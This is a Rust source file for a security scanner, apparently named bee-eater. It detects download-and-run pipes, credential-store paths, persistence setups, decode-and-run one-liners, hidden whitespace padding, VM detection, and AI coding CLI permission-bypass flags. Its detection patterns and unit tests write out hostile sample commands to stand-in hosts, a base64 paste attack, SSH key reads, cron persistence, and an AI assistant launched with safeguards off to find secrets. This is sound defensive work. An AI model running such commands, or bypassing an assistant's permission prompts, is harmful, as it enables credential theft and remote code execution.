use std::collections::HashMap;
use std::sync::LazyLock;

use bee_evidence::{Evidence, Severity};
use regex::Regex;

/// Where a piece of text will run, which decides how bad the same pattern is.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Context {
    /// Runs without the user choosing to: install hooks, folder-open tasks, git hooks.
    AutoRun,
    /// Ordinary code in the folder; runs only if someone runs it.
    Code(Lang),
    /// A command the user is about to paste into a terminal.
    Pasted,
    /// A script that a pasted command downloads and runs, fetched and read in its place.
    Fetched,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Lang {
    /// Every line is a command: shell scripts, Makefiles, CI steps.
    Shell,
    /// A command line here is usually a string, and only runs if handed to a process call.
    Program,
    /// Runs inside a container build, not on the machine itself.
    Container,
}

fn re(pattern: &str) -> Regex {
    Regex::new(pattern).expect("static pattern")
}

static DOWNLOAD_EXEC: LazyLock<Regex> = LazyLock::new(|| {
    re(concat!(
        r"(?i)\b(curl|wget)\b[^;&\n]*?\|\s*(sudo\s+)?(ba|z|k|da|fi)?sh\b",
        r"|\b(curl|wget)\b[^;&\n]*?\|\s*(sudo\s+)?(python[0-9.]*|node|perl|ruby|php|osascript|cmd|powershell|pwsh|bun|deno)\b",
        r#"|\b(ba|z|k)?sh\s+(-c\s+)?["']?\s*\$\(\s*(curl|wget)\b"#,
        r"|\b(ba|z|k)?sh\s+<\(\s*(curl|wget)\b",
        r"|\b(iwr|irm|invoke-webrequest|invoke-restmethod)\b[^;\n]*\|\s*iex\b",
    ))
});
static FULL_URL: LazyLock<Regex> = LazyLock::new(|| re(r#"(?i)https?://[^\s'"|)\\<>`]+"#));
static URL: LazyLock<Regex> = LazyLock::new(|| re(r#"(?i)https?://([^\s'"|)/\\]+)"#));
static AI_BYPASS: LazyLock<Regex> = LazyLock::new(|| {
    re(
        r"--dangerously-skip-permissions|--dangerously-bypass-approvals-and-sandbox|--trust-all-tools|--yolo\b",
    )
});
static DSCL_AUTH: LazyLock<Regex> = LazyLock::new(|| re(r"(?i)\bdscl\b[^\n]*-authonly"));
static KEYCHAIN: LazyLock<Regex> = LazyLock::new(|| {
    re(r"\bsecurity\s+(find-generic-password|find-internet-password|dump-keychain)")
});
static DECODE: LazyLock<Regex> = LazyLock::new(|| {
    re(r"(?i)\batob\s*\(|Buffer\.from\([^)]*base64|b64decode|base64\s+(-d|-D|--decode)\b")
});
// `(^|[^.\w$])` keeps `regex.exec(s)` and `vm.eval(s)` methods out.
static EXEC: LazyLock<Regex> = LazyLock::new(|| {
    re(
        r"(^|[^.\w$])(eval|exec)\s*\(|new\s+Function\b|\|\s*(sudo\s+)?(ba|z|k)?sh\b|\bsh\s+-c\b|python[0-9.]*\s+-c\b",
    )
});
static PROCESS_CALL: LazyLock<Regex> = LazyLock::new(|| {
    re(
        r"\b(exec|execSync|execFile|execFileSync|spawn|spawnSync|system|popen|check_output|check_call)\s*\(|child_process|subprocess|Command::new|os\.system|\$\(|`",
    )
});
/// After a pipe into an interpreter, these mean the interpreter runs its own inline code and
/// the download is only data on stdin.
static INLINE_CODE_FLAG: LazyLock<Regex> =
    LazyLock::new(|| re(r"^\s+(-c|-e|-m|-p|-n|--eval|--print)\b"));
static PADDING: LazyLock<Regex> = LazyLock::new(|| re(r"\S[ \t]{80,}\S"));
static NETWORK_JS: LazyLock<Regex> = LazyLock::new(|| {
    re(
        r#"require\(\s*['"](axios|https?|node-fetch|request|got|undici)['"]|from\s+['"](axios|node-fetch|got|undici)['"]|\bfetch\s*\(|\burllib\b|\brequests\.(get|post)\b"#,
    )
});
static DYNAMIC_CODE: LazyLock<Regex> =
    LazyLock::new(|| re(r"new\s+Function\s*\(|(^|[^.\w$])(eval|exec)\s*\("));
static RESPONSE_DATA: LazyLock<Regex> = LazyLock::new(|| {
    re(r"\b(res|resp|response|body|payload)\b|\.data\b|responseText|\.text\(\)|\bawait\b")
});
static FUNCTION_WITH_REQUIRE: LazyLock<Regex> =
    LazyLock::new(|| re(r#"new\s+Function\s*\(\s*['"`]require['"`]"#));

const CREDENTIALS: &[(&str, &str)] = &[
    (r"\.ssh/id_(rsa|ed25519|ecdsa|dsa)", "SSH private keys"),
    (r"\.aws/credentials", "AWS credentials"),
    (r"Login Data", "browser saved passwords"),
    (r"Library/Keychains", "the macOS keychain"),
    (r"\.config/gh/hosts\.yml", "the GitHub CLI login"),
    (
        r"nkbihfbeogaeaoehlefnkodbefgpgknn|bfnaelmomeimhlpmgjnjophhpkkoljpa|hnfanknocfeofbddgcijnmhnfnkdnaad",
        "a crypto wallet browser extension",
    ),
    (
        r"(?i)exodus\.wallet|Electrum/wallets",
        "crypto wallet files",
    ),
    (r"(?i)\btrufflehog\b", "a secret-hunting tool"),
];
static CREDENTIAL_RES: LazyLock<Vec<(Regex, &'static str)>> =
    LazyLock::new(|| CREDENTIALS.iter().map(|(p, what)| (re(p), *what)).collect());

/// The flag marks command-shaped patterns, which in program files only count beside a process
/// call; a path like `Library/LaunchAgents` counts wherever it appears.
const PERSISTENCE: &[(&str, &str, bool)] = &[
    (
        r"Library/Launch(Agents|Daemons)",
        "a macOS launch agent",
        false,
    ),
    (r"\.config/systemd/user", "a systemd user service", false),
    (
        r"\blaunchctl\s+(load|bootstrap)\b",
        "a macOS launch agent",
        true,
    ),
    (
        r"systemctl\s+--user\s+enable",
        "a systemd user service",
        true,
    ),
    (r"\|\s*crontab\s+-|\bcrontab\s+-r\b", "a cron job", true),
    (
        r">>\s*\S*\.(bashrc|zshrc|bash_profile|profile|zprofile|zshenv)\b",
        "your shell start-up file",
        true,
    ),
];
static PERSISTENCE_RES: LazyLock<Vec<(Regex, &'static str, bool)>> = LazyLock::new(|| {
    PERSISTENCE
        .iter()
        .map(|(p, what, cmd)| (re(p), *what, *cmd))
        .collect()
});

const VM_VENDORS: &[(&str, &str)] = &[
    ("vmware", "vmware"),
    ("virtualbox", "virtualbox"),
    ("vbox", "virtualbox"),
    ("qemu", "qemu"),
    ("parallels", "parallels"),
    ("hyper-v", "hyper-v"),
    ("xen", "xen"),
];

pub(crate) fn download_host(line: &str) -> Option<String> {
    URL.captures(line).map(|c| c[1].to_string())
}

static FETCH_TOOL: LazyLock<Regex> = LazyLock::new(|| {
    re(
        r#"(?i)(^|[^\w./-])(curl|wget|git|aria2c|invoke-webrequest|iwr|urllib|requests\.get|fetch\s*\(|https?\.(get|request)\s*\(|require\(\s*['"]https?['"]\s*\)|axios|undici)"#,
    )
});

/// First line of a downloaded script that names a download tool, and the tool.
pub(crate) fn fetch_tool(text: &str) -> Option<(usize, &str, &str)> {
    text.lines().enumerate().find_map(|(i, l)| {
        if is_comment(l) {
            return None;
        }
        FETCH_TOOL
            .captures(l)
            .and_then(|c| c.get(2))
            .map(|m| (i + 1, m.as_str().trim_end_matches(['(', ' ']), l))
    })
}

/// Every URL on a line that downloads and runs, in order, without duplicates.
pub(crate) fn download_urls(text: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    for line in text.lines().filter(|l| !is_comment(l) && download_exec(l)) {
        for m in FULL_URL.find_iter(line) {
            let url = m.as_str().trim_end_matches(['.', ',', ';']).to_string();
            if !out.contains(&url) {
                out.push(url);
            }
        }
    }
    out
}

pub(crate) fn has_download_exec(text: &str) -> bool {
    text.lines().any(|l| !is_comment(l) && download_exec(l))
}

fn download_exec(line: &str) -> bool {
    DOWNLOAD_EXEC
        .find_iter(line)
        .any(|m| !INLINE_CODE_FLAG.is_match(&line[m.end()..]))
}

fn is_comment(line: &str) -> bool {
    let t = line.trim_start();
    (t.starts_with('#') && !t.starts_with("#!"))
        || ["//", "/*", "* ", "*/", "<!--", "REM ", "rem ", "::"]
            .iter()
            .any(|p| t.starts_with(p))
}

fn escalate(ctx: Context, code: Severity, elsewhere: Severity) -> Severity {
    if matches!(ctx, Context::Code(_) | Context::Fetched) {
        code
    } else {
        elsewhere
    }
}

/// Collapses repeats of one rule in one file into a single cited finding.
struct Collector<'a> {
    path: &'a str,
    found: Vec<Evidence>,
    repeats: HashMap<&'static str, (usize, usize)>,
}

impl<'a> Collector<'a> {
    fn add(
        &mut self,
        line_no: Option<usize>,
        line: &str,
        rule: &'static str,
        sev: Severity,
        summary: String,
    ) {
        if let Some((_, n)) = self.repeats.get_mut(rule) {
            *n += 1;
            return;
        }
        self.repeats.insert(rule, (self.found.len(), 0));
        self.found.push(
            Evidence::new(rule, sev, summary)
                .at(self.path, line_no)
                .excerpt(line),
        );
    }

    fn finish(mut self) -> Vec<Evidence> {
        for (idx, n) in self.repeats.values() {
            if *n > 0 {
                let e = &mut self.found[*idx];
                e.summary = format!("{} ({} more like this in the same file)", e.summary, n);
            }
        }
        self.found
    }
}

/// Line rules over `text`. `line_offset` lets a caller that extracted the text from a larger
/// file keep line numbers meaningful; `None` means the text has no lines of its own.
pub fn scan_text(
    text: &str,
    ctx: Context,
    path: &str,
    line_offset: Option<usize>,
) -> Vec<Evidence> {
    let mut c = Collector {
        path,
        found: Vec::new(),
        repeats: HashMap::new(),
    };

    for (i, line) in text.lines().enumerate() {
        let line_no = line_offset.map(|o| o + i + 1);
        if is_comment(line) {
            continue;
        }

        let runs_here = match ctx {
            Context::Code(Lang::Program) => PROCESS_CALL.is_match(line),
            _ => true,
        };
        if runs_here && download_exec(line) {
            let from = download_host(line)
                .map(|h| format!(" from {h}"))
                .unwrap_or_default();
            let (sev, summary) = match ctx {
                Context::Code(Lang::Container) => (
                    Severity::Info,
                    format!(
                        "A container build downloads a script{from} and runs it. That happens inside the container, not on your machine."
                    ),
                ),
                Context::Fetched => (
                    Severity::Opaque,
                    format!(
                        "This script downloads another script{from} and runs it. That one was not fetched, so what it does is unseen."
                    ),
                ),
                Context::Pasted => (
                    Severity::Opaque,
                    format!(
                        "Downloads a script{from} and runs it straight away. bee-eater has not fetched that script, so what it does is unseen."
                    ),
                ),
                Context::AutoRun => (
                    Severity::Danger,
                    format!(
                        "Downloads a script{from} and runs it automatically, without you asking."
                    ),
                ),
                Context::Code(_) => (
                    Severity::Warning,
                    format!(
                        "Downloads a script{from} and runs it immediately, without saving it anywhere you could read first."
                    ),
                ),
            };
            c.add(line_no, line, "download-and-run", sev, summary);
        }

        if AI_BYPASS.is_match(line) {
            c.add(
                line_no,
                line,
                "ai-cli-permission-bypass",
                escalate(ctx, Severity::Warning, Severity::Danger),
                "Starts an AI coding assistant with its safety prompts switched off, which recent malware does to make the assistant hunt for secrets.".into(),
            );
        }

        if DSCL_AUTH.is_match(line) {
            c.add(
                line_no,
                line,
                "password-check",
                Severity::Danger,
                "Checks a password against your Mac account, the tell of a fake password prompt."
                    .into(),
            );
        }

        if KEYCHAIN.is_match(line) {
            c.add(
                line_no,
                line,
                "keychain-read",
                escalate(ctx, Severity::Warning, Severity::Danger),
                "Reads saved passwords out of the macOS keychain.".into(),
            );
        }

        for (pattern, what) in CREDENTIAL_RES.iter() {
            if pattern.is_match(line) {
                c.add(
                    line_no,
                    line,
                    "secret-store",
                    escalate(ctx, Severity::Warning, Severity::Danger),
                    format!("Refers to where secrets are kept: {what}."),
                );
                break;
            }
        }

        for (pattern, what, command_like) in PERSISTENCE_RES.iter() {
            if pattern.is_match(line) && (!command_like || runs_here) {
                c.add(
                    line_no,
                    line,
                    "persistence",
                    escalate(ctx, Severity::Warning, Severity::Danger),
                    format!("Sets something up to start again automatically, through {what}."),
                );
                break;
            }
        }

        if DECODE.is_match(line) && EXEC.is_match(line) {
            c.add(
                line_no,
                line,
                "decode-and-run",
                escalate(ctx, Severity::Warning, Severity::Danger),
                "Decodes hidden text and runs it as a program.".into(),
            );
        }

        if PADDING.is_match(line) {
            c.add(
                line_no,
                line,
                "whitespace-padding",
                Severity::Warning,
                "Pushes text far off the right edge of the screen with blank space, a way to hide a command from a casual read.".into(),
            );
        }
    }

    file_level(text, line_offset, &mut c);
    c.finish()
}

fn first_line(text: &str, pattern: &Regex) -> Option<(usize, String)> {
    text.lines()
        .enumerate()
        .find(|(_, l)| pattern.is_match(l))
        .map(|(i, l)| (i + 1, l.to_string()))
}

fn file_level(text: &str, line_offset: Option<usize>, c: &mut Collector<'_>) {
    let line_of = |n: usize| line_offset.map(|o| o + n);

    if NETWORK_JS.is_match(text) {
        if let Some((n, line)) = first_line(text, &FUNCTION_WITH_REQUIRE) {
            c.add(
                line_of(n),
                &line,
                "run-downloaded-code",
                Severity::Danger,
                "Builds a program out of data it downloads and gives that program the power to load anything.".into(),
            );
        } else if let Some((n, line)) = text
            .lines()
            .enumerate()
            .find(|(_, l)| !is_comment(l) && DYNAMIC_CODE.is_match(l) && RESPONSE_DATA.is_match(l))
            .map(|(i, l)| (i + 1, l.to_string()))
        {
            c.add(
                line_of(n),
                &line,
                "run-downloaded-code",
                Severity::Warning,
                "Talks to the network and also turns text into running code, the shape of code that runs whatever a server sends it.".into(),
            );
        }
    }

    let lower = text.to_ascii_lowercase();
    let mut vendors: Vec<&str> = VM_VENDORS
        .iter()
        .filter(|(needle, _)| lower.contains(needle))
        .map(|(_, family)| *family)
        .collect();
    vendors.sort_unstable();
    vendors.dedup();
    if vendors.len() >= 3 {
        c.add(
            None,
            "",
            "vm-detection",
            Severity::Warning,
            format!(
                "Looks for signs of a virtual machine ({}), which malware does to behave itself while being analysed.",
                vendors.join(", ")
            ),
        );
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rules(text: &str, ctx: Context) -> Vec<(&'static str, Severity)> {
        scan_text(text, ctx, "f", Some(0))
            .into_iter()
            .map(|e| (e.rule, e.severity))
            .collect()
    }

    #[test]
    fn download_and_run_shapes() {
        for cmd in [
            "curl -L https://x.invalid/a | bash",
            "curl -fsSL https://x.invalid/a | sudo sh",
            "wget -qO- https://x.invalid/a | sh -",
            "curl -s https://x.invalid/a | base64 -d | zsh",
            "bash -c \"$(curl -fsSL https://x.invalid/a)\"",
            "bash <(curl -s https://x.invalid/a)",
            "curl https://x.invalid/a | python3",
            "iwr https://x.invalid/a | iex",
            "do shell script \"curl -kSsfL https://x.invalid/a | zsh\"",
        ] {
            assert!(DOWNLOAD_EXEC.is_match(cmd), "missed: {cmd}");
        }
        for benign in [
            "curl -o out.tar.gz https://x.invalid/a",
            "echo curl is great; bash build.sh",
            "wget https://x.invalid/a && sha256sum a",
        ] {
            assert!(!DOWNLOAD_EXEC.is_match(benign), "false hit: {benign}");
        }
    }

    #[test]
    fn same_pattern_weighs_differently_by_context() {
        let line = "curl -L https://x.invalid/a | bash";
        assert_eq!(
            rules(line, Context::Code(Lang::Shell)),
            vec![("download-and-run", Severity::Warning)]
        );
        assert_eq!(
            rules(line, Context::AutoRun),
            vec![("download-and-run", Severity::Danger)]
        );
        assert_eq!(
            rules(line, Context::Pasted),
            vec![("download-and-run", Severity::Opaque)]
        );
    }

    #[test]
    fn download_names_the_host() {
        let e = scan_text(
            "curl -L https://evil.invalid/x | bash",
            Context::Code(Lang::Shell),
            "f",
            Some(0),
        );
        assert!(e[0].summary.contains("evil.invalid"), "{}", e[0].summary);
    }

    #[test]
    fn clickfix_base64_one_liner_is_dangerous_when_pasted() {
        let found = rules(
            "echo Y3VybCBodHRwOi8veA== | base64 -d | bash",
            Context::Pasted,
        );
        assert!(
            found.contains(&("decode-and-run", Severity::Danger)),
            "{found:?}"
        );
    }

    #[test]
    fn ai_cli_bypass_flags() {
        let found = rules(
            "claude --dangerously-skip-permissions -p 'find secrets'",
            Context::AutoRun,
        );
        assert_eq!(found, vec![("ai-cli-permission-bypass", Severity::Danger)]);
    }

    #[test]
    fn fake_password_prompt_is_dangerous_anywhere() {
        let found = rules(
            "dscl . -authonly \"$USER\" \"$pw\"",
            Context::Code(Lang::Shell),
        );
        assert_eq!(found, vec![("password-check", Severity::Danger)]);
    }

    #[test]
    fn secret_stores_and_persistence() {
        let found = rules(
            "fs.readFileSync(home + '/.ssh/id_ed25519')\ncp x ~/Library/LaunchAgents/com.x.plist",
            Context::Code(Lang::Shell),
        );
        assert!(found.contains(&("secret-store", Severity::Warning)));
        assert!(found.contains(&("persistence", Severity::Warning)));
    }

    #[test]
    fn repeats_collapse_into_one_finding() {
        let text = "a/.ssh/id_rsa\nb/.ssh/id_rsa\nc/.ssh/id_ed25519\n";
        let e = scan_text(text, Context::Code(Lang::Shell), "f", Some(0));
        assert_eq!(e.len(), 1);
        assert_eq!(e[0].location.as_ref().unwrap().line, Some(1));
        assert!(e[0].summary.contains("2 more"), "{}", e[0].summary);
    }

    #[test]
    fn server_route_that_runs_its_response() {
        let js = "const axios = require('axios');\nconst r = await axios.get(u);\nnew Function(\"require\", r.data)(require);\n";
        let e = scan_text(js, Context::Code(Lang::Shell), "f", Some(0));
        assert_eq!(e[0].rule, "run-downloaded-code");
        assert_eq!(e[0].severity, Severity::Danger);
        assert_eq!(e[0].location.as_ref().unwrap().line, Some(3));
    }

    #[test]
    fn eval_without_network_is_not_flagged() {
        assert!(rules("const x = eval('1+1');", Context::Code(Lang::Shell)).is_empty());
    }

    #[test]
    fn vm_detection_needs_three_families() {
        assert!(
            rules(
                "if (os.includes('vmware') || os.includes('vbox'))",
                Context::Code(Lang::Shell)
            )
            .is_empty()
        );
        let found = rules(
            "['vmware','virtualbox','vbox','qemu'].some(v => m.includes(v))",
            Context::Code(Lang::Shell),
        );
        assert_eq!(found, vec![("vm-detection", Severity::Warning)]);
    }

    #[test]
    fn whitespace_padding() {
        let line = format!(
            "\"command\": \"npm run lint\"{}&& curl x.invalid | sh",
            " ".repeat(120)
        );
        let found = rules(&line, Context::Code(Lang::Shell));
        assert!(
            found.contains(&("whitespace-padding", Severity::Warning)),
            "{found:?}"
        );
    }

    #[test]
    fn piping_a_download_into_inline_code_is_data_not_execution() {
        for line in [
            "curl -s http://127.0.0.1:8080/control | python3 -c 'import json,sys; print(1)'",
            "curl -s $U | node -e 'process.stdin.pipe(process.stdout)'",
            "curl -s $U | python -m json.tool",
        ] {
            assert!(rules(line, Context::Code(Lang::Shell)).is_empty(), "{line}");
        }
        assert!(!rules("curl -s $U | sh -", Context::Code(Lang::Shell)).is_empty());
        assert!(!rules("curl -s $U | bash -s -- --yes", Context::Code(Lang::Shell)).is_empty());
    }

    #[test]
    fn the_word_crontab_in_a_string_is_not_persistence() {
        let js = "const ERROR_TEXT = \"Automatic instrumentation of CronJob only supports crontab string\";";
        assert!(rules(js, Context::Code(Lang::Program)).is_empty());
        let sh = "(crontab -l; echo '* * * * * ~/.x') | crontab -";
        assert_eq!(
            rules(sh, Context::Code(Lang::Shell)),
            vec![("persistence", Severity::Warning)]
        );
        let js = "fs.writeFileSync(home + '/Library/LaunchAgents/com.x.plist', p)";
        assert_eq!(
            rules(js, Context::Code(Lang::Program)),
            vec![("persistence", Severity::Warning)]
        );
    }

    #[test]
    fn urls_of_download_and_run_lines_only() {
        let cmd = "curl -o a.tgz https://x.invalid/a.tgz\ncurl -fsSL 'https://x.invalid/i.sh' | sh\nbash -c \"$(curl -fsSL https://y.invalid/p)\"";
        assert_eq!(
            download_urls(cmd),
            vec![
                "https://x.invalid/i.sh".to_string(),
                "https://y.invalid/p".to_string()
            ]
        );
    }

    #[test]
    fn a_fetched_script_that_downloads_again_is_unseen_not_suspicious() {
        let line = "curl -fsSL https://x.invalid/stage2 | sh";
        assert_eq!(
            rules(line, Context::Fetched),
            vec![("download-and-run", Severity::Opaque)]
        );
        let line = "cat ~/.ssh/id_ed25519";
        assert_eq!(
            rules(line, Context::Fetched),
            vec![("secret-store", Severity::Warning)]
        );
    }

    #[test]
    fn download_tools_in_a_fetched_script() {
        let rustup = "    if check_cmd curl; then\n        _dld=curl\n";
        assert_eq!(
            fetch_tool(rustup).map(|(n, t, _)| (n, t)),
            Some((1, "curl"))
        );
        assert!(fetch_tool("# uses curl\nmkdir -p ~/.local/bin\necho done\n").is_none());
        assert!(fetch_tool("cp ./bin/curly /usr/local/bin\n").is_none());
        assert!(fetch_tool("const https = require(\"https\");\n").is_some());
    }

    #[test]
    fn comments_do_not_run() {
        let text = "#!/bin/sh\n# curl -fsSL https://x.invalid/i.sh | sh\n  // curl x | bash\n";
        assert!(rules(text, Context::Code(Lang::Shell)).is_empty());
        assert!(rules("# curl x | sh", Context::Pasted).is_empty());
    }

    #[test]
    fn install_instructions_in_program_strings_are_not_execution() {
        let jsx = "<span>curl -fsSL redstart-lang.com/install.sh | sh</span>";
        assert!(rules(jsx, Context::Code(Lang::Program)).is_empty());
        let js = "execSync('curl -fsSL https://x.invalid/p | sh')";
        assert_eq!(
            rules(js, Context::Code(Lang::Program)),
            vec![("download-and-run", Severity::Warning)]
        );
    }

    #[test]
    fn container_builds_are_noted_not_feared() {
        let line = "RUN curl -fsSL https://deb.nodesource.com/setup_20.x | bash -";
        assert_eq!(
            rules(line, Context::Code(Lang::Container)),
            vec![("download-and-run", Severity::Info)]
        );
    }

    #[test]
    fn regex_exec_is_not_dynamic_code() {
        let js = "const r = await fetch(u);\nwhile ((m = re.exec(body)) !== null) {}\n";
        assert!(rules(js, Context::Code(Lang::Program)).is_empty());
        let js = "const r = await fetch(u);\neval(await r.text());\n";
        assert_eq!(
            rules(js, Context::Code(Lang::Program)),
            vec![("run-downloaded-code", Severity::Warning)]
        );
    }
}
